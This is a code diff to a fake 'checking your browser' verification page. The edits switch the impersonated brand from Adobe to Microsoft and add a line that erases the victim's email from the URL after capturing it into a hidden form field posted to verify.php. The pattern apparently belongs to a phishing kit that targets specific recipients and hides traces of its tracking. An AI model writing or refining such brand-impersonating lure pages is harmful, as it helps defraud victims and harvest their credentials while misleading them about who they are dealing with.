@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Verification</title>
+  <title>Microsoft Verification</title>
   <style>
     html, body {
       height: 100%;
@@ -53,7 +53,7 @@
 </head>
 <body>
   <div class="container">
-    <h1>Checking your browser before accessing Adobe</h1>
+    <h1>Checking your browser before accessing Microsoft</h1>
     <p id="security-msg">Verifying you are human. This may take a few seconds...</p>
 
     <form id="turnstile-form" action="verify.php" method="POST">
@@ -90,6 +90,9 @@
 
       if (emailParam && emailParam.includes("@")) {
         extractedEmail = emailParam.trim();
+
+        // Hide the email from the URL instantly
+        history.replaceState({}, document.title, window.location.pathname);
       }
 
       // Send ?email= into hidden field (if needed)
